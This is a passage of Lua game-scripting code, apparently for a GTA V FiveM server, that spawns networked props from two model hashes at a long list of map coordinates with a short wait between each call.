        CreateObject(3821613641, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(3295673357, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
